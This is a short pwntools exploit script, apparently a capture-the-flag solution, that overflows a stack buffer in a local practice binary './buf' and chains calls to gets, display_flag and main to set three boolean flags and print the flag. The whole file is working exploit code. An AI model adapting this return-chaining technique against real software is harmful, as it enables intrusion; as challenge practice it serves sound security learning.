#!/bin/python3
from pwn import *

p = process('./buf')
e = ELF('./buf')

offsetToBuffer = 0x002c - 0x0010



payload = b'A'*offsetToBuffer
payload += p32(e.sym['gets']) # write into the paramter
payload += p32(e.sym['display_flag']) # where we return to after calling gets. 
payload += p32(e.sym['win1']) # this is the parameter given, that will be written into
payload += b'\n'
payload += b'\x01\x01\x01' # three trues. We don't have to call gets 3 times, as the bools are next to eachother on the stack
payload += p32(e.sym['main']) # go to main after


p.sendline(payload)

p.interactive()	
